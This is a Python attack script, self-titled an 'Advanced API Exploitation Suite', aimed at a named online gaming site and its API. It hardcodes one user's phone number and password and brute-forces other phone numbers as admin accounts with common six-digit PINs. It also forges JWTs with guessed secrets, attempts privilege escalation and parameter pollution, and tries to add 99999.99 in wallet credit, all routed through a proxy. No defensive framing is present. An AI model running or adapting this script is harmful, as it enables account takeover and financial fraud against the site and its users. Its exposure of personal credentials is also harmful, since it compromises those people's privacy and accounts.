#!/usr/bin/env python3

import requests
import json
import time
import sys
import jwt
from urllib.parse import urljoin
import itertools

# Configuration
TARGET_DOMAIN = "https://jklmn23456.com"
FRONTEND_DOMAIN = "https://pigslot.co"
CUSTOMER_CODE = "PS663888386"
PHONE_NUMBER = "0960422161"
PASSWORD = "181242"

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

# Target phone numbers to test
TARGET_ADMIN_PHONES = [
    "0642052671",
    "0818510592",
    "0960422161"  # Current user
]

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")

def get_session():
    """Create session with proxy"""
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'th,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Origin': FRONTEND_DOMAIN,
        'Referer': f'{FRONTEND_DOMAIN}/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
    })
    return session

def authenticate_user(phone, password):
    """Authenticate user and get token"""
    session = get_session()
    login_url = f"{TARGET_DOMAIN}/api/v1/auth/login"
    
    login_data = {
        "username": phone,
        "password": password
    }
    
    try:
        response = session.post(login_url, json=login_data, timeout=15, verify=False)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'SUCCESS':
                token = data.get('data', {}).get('access_token')
                customer_code = data.get('data', {}).get('customer_code')
                return token, customer_code, session
    except Exception as e:
        print_error(f"Authentication failed for {phone}: {e}")
    
    return None, None, None

def test_admin_force_with_auth(session, token):
    """Test admin-force with authenticated session"""
    print_info("Testing admin-force with authenticated session...")
    
    # Set authorization header
    session.headers.update({'Authorization': f'bearer {token}'})
    
    try:
        # Access admin-force endpoint
        admin_force_url = f"{FRONTEND_DOMAIN}/admin-force"
        response = session.get(admin_force_url, timeout=15, verify=False)
        
        if response.status_code == 200:
            print_success(f"Admin-force accessible: {len(response.text)} bytes")
            
            # Check for admin indicators
            admin_indicators = ['admin', 'administrator', 'dashboard', 'control panel']
            content_lower = response.text.lower()
            
            found_indicators = [ind for ind in admin_indicators if ind in content_lower]
            if found_indicators:
                print_success(f"Admin indicators found: {found_indicators}")
                return True
    except Exception as e:
        print_error(f"Admin-force test failed: {e}")
    
    return False

def test_vip_api_manipulation(session, token, customer_code):
    """Test VIP API for privilege escalation"""
    print_info("Testing VIP API manipulation...")
    
    session.headers.update({'Authorization': f'bearer {token}'})
    
    # Original VIP status
    vip_url = f"{TARGET_DOMAIN}/api/v1/loyalty/{customer_code}/vip/status"
    
    try:
        response = session.get(vip_url, timeout=15, verify=False)
        if response.status_code == 200:
            vip_data = response.json()
            print_info(f"Current VIP Level: {vip_data.get('data', {}).get('user_vip_level')}")
            
            # Try to modify VIP status
            vip_endpoints = [
                f"/api/v1/loyalty/{customer_code}/vip/upgrade",
                f"/api/v1/loyalty/{customer_code}/vip/admin",
                f"/api/v1/admin/loyalty/{customer_code}/vip",
                f"/api/v1/loyalty/admin/upgrade",
                f"/api/v1/vip/admin/set"
            ]
            
            for endpoint in vip_endpoints:
                test_url = f"{TARGET_DOMAIN}{endpoint}"
                
                # Test POST with admin privileges
                admin_data = {
                    "user_vip_level": "ADMIN",
                    "user_tier": "Admin Level",
                    "customer_code": customer_code,
                    "admin": True,
                    "privileges": ["admin", "super_user"]
                }
                
                try:
                    response = session.post(test_url, json=admin_data, timeout=10, verify=False)
                    if response.status_code == 200:
                        print_success(f"VIP manipulation possible: {endpoint}")
                        return True
                except:
                    pass
                    
    except Exception as e:
        print_error(f"VIP API test failed: {e}")
    
    return False

def test_credit_manipulation(session, token, customer_code):
    """Test credit manipulation endpoints"""
    print_info("Testing credit manipulation...")
    
    session.headers.update({'Authorization': f'bearer {token}'})
    
    credit_endpoints = [
        f"/api/v1/wallet/{customer_code}/balance",
        f"/api/v1/wallet/{customer_code}/add",
        f"/api/v1/wallet/{customer_code}/credit",
        f"/api/v1/admin/wallet/{customer_code}/add",
        f"/api/v1/admin/wallet/{customer_code}/balance",
        f"/api/v1/transaction/{customer_code}/add",
        f"/api/v1/admin/transaction/add",
        f"/api/v1/loyalty/{customer_code}/credit/add",
        f"/api/v1/admin/credit/add"
    ]
    
    target_amount = 99999.99
    
    for endpoint in credit_endpoints:
        test_url = f"{TARGET_DOMAIN}{endpoint}"
        
        credit_payloads = [
            {"amount": target_amount, "type": "admin_credit", "reason": "admin_adjustment"},
            {"balance": target_amount, "action": "add"},
            {"credit": target_amount, "customer_code": customer_code},
            {"value": target_amount, "transaction_type": "credit"},
            {"add_amount": target_amount, "admin": True}
        ]
        
        for payload in credit_payloads:
            try:
                # Test POST
                response = session.post(test_url, json=payload, timeout=10, verify=False)
                if response.status_code == 200:
                    result = response.json()
                    if result.get('status') == 'SUCCESS':
                        print_success(f"Credit manipulation successful: {endpoint}")
                        print_success(f"Response: {result}")
                        return True
                
                # Test PUT
                response = session.put(test_url, json=payload, timeout=10, verify=False)
                if response.status_code == 200:
                    result = response.json()
                    if result.get('status') == 'SUCCESS':
                        print_success(f"Credit manipulation successful (PUT): {endpoint}")
                        print_success(f"Response: {result}")
                        return True
                        
            except Exception as e:
                continue
    
    return False

def brute_force_admin_phones(target_phones):
    """Brute force admin phone numbers with 6-digit passwords"""
    print_info("Testing admin phone numbers...")
    
    # Generate 6-digit passwords (common patterns)
    common_patterns = [
        "123456", "000000", "111111", "222222", "333333", "444444", "555555",
        "666666", "777777", "888888", "999999", "654321", "112233", "998877",
        "123123", "456456", "789789", "147258", "369258", "159753"
    ]
    
    for phone in target_phones:
        print_info(f"Testing phone: {phone}")
        
        for password in common_patterns:
            try:
                token, customer_code, session = authenticate_user(phone, password)
                if token:
                    print_success(f"ADMIN CREDENTIALS FOUND: {phone}:{password}")
                    print_success(f"Customer Code: {customer_code}")
                    
                    # Test admin privileges
                    if test_admin_force_with_auth(session, token):
                        print_success("Admin privileges confirmed!")
                        
                        # Test credit manipulation
                        if test_credit_manipulation(session, token, customer_code):
                            print_success("Credit manipulation possible!")
                        
                        return phone, password, token, customer_code
            except:
                continue
            
            time.sleep(0.5)  # Rate limiting
    
    return None, None, None, None

def test_jwt_manipulation(token):
    """Test JWT token manipulation"""
    print_info("Testing JWT token manipulation...")
    
    try:
        # Decode without verification
        decoded = jwt.decode(token, options={"verify_signature": False})
        print_info(f"Current JWT payload: {decoded}")
        
        # Try to modify to admin
        admin_payload = decoded.copy()
        admin_payload['admin'] = True
        admin_payload['role'] = 'admin'
        admin_payload['privileges'] = ['admin', 'super_user']
        admin_payload['user_type'] = 'admin'
        
        # Common JWT secrets to try
        secrets = ['secret', 'admin', 'password', '123456', 'pigslot', 'key', '']
        
        for secret in secrets:
            try:
                admin_token = jwt.encode(admin_payload, secret, algorithm='HS256')
                print_info(f"Generated admin token with secret '{secret}': {admin_token[:50]}...")
                return admin_token
            except:
                continue
                
    except Exception as e:
        print_error(f"JWT manipulation failed: {e}")
    
    return None

def test_api_parameter_pollution(session, token, customer_code):
    """Test HTTP Parameter Pollution for privilege escalation"""
    print_info("Testing parameter pollution attacks...")
    
    session.headers.update({'Authorization': f'bearer {token}'})
    
    # Test various parameter pollution techniques
    pollution_tests = [
        # Multiple customer_code parameters
        f"/api/v1/loyalty/{customer_code}/vip/status?customer_code=admin&customer_code={customer_code}",
        # Admin parameter injection
        f"/api/v1/loyalty/{customer_code}/vip/status?admin=true&role=admin",
        # User type override
        f"/api/v1/loyalty/{customer_code}/vip/status?user_type=admin&privilege=admin",
        # VIP level override
        f"/api/v1/loyalty/{customer_code}/vip/status?user_vip_level=ADMIN&override=true"
    ]
    
    for test_url in pollution_tests:
        try:
            full_url = f"{TARGET_DOMAIN}{test_url}"
            response = session.get(full_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                # Check for elevated privileges in response
                if 'admin' in str(data).lower() or 'ADMIN' in str(data):
                    print_success(f"Parameter pollution successful: {test_url}")
                    print_success(f"Response: {data}")
                    return True
        except:
            continue
    
    return False

def main():
    print_info("🎯 Advanced API Exploitation Suite")
    print_info("=" * 60)
    
    # Test 1: Authenticate current user
    print_info("Phase 1: Authenticating current user...")
    token, customer_code, session = authenticate_user(PHONE_NUMBER, PASSWORD)
    
    if not token:
        print_error("Failed to authenticate current user")
        return
    
    print_success(f"Authenticated: {PHONE_NUMBER}")
    print_success(f"Customer Code: {customer_code}")
    
    # Test 2: Admin-force with auth
    print_info("\nPhase 2: Testing admin-force with authentication...")
    admin_force_success = test_admin_force_with_auth(session, token)
    
    # Test 3: JWT manipulation
    print_info("\nPhase 3: Testing JWT manipulation...")
    admin_token = test_jwt_manipulation(token)
    if admin_token:
        session.headers.update({'Authorization': f'bearer {admin_token}'})
    
    # Test 4: VIP API manipulation
    print_info("\nPhase 4: Testing VIP privilege escalation...")
    vip_success = test_vip_api_manipulation(session, token, customer_code)
    
    # Test 5: Parameter pollution
    print_info("\nPhase 5: Testing parameter pollution...")
    pollution_success = test_api_parameter_pollution(session, token, customer_code)
    
    # Test 6: Credit manipulation
    print_info("\nPhase 6: Testing credit manipulation...")
    credit_success = test_credit_manipulation(session, token, customer_code)
    
    # Test 7: Brute force admin phones
    print_info("\nPhase 7: Testing admin phone numbers...")
    admin_phone, admin_pass, admin_token, admin_customer = brute_force_admin_phones(TARGET_ADMIN_PHONES)
    
    # Generate report
    print_info("\n" + "=" * 60)
    print_info("EXPLOITATION SUMMARY")
    print_info("=" * 60)
    
    if admin_force_success:
        print_success("✅ Admin-force vulnerability confirmed")
    
    if vip_success:
        print_success("✅ VIP privilege escalation possible")
    
    if pollution_success:
        print_success("✅ Parameter pollution successful")
    
    if credit_success:
        print_success("✅ Credit manipulation possible")
    
    if admin_phone:
        print_success(f"✅ Admin account compromised: {admin_phone}:{admin_pass}")
    
    if not any([admin_force_success, vip_success, pollution_success, credit_success, admin_phone]):
        print_warning("❌ No exploitation vectors successful")
    
    print_info("\nCheck ZAP logs for captured traffic!")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()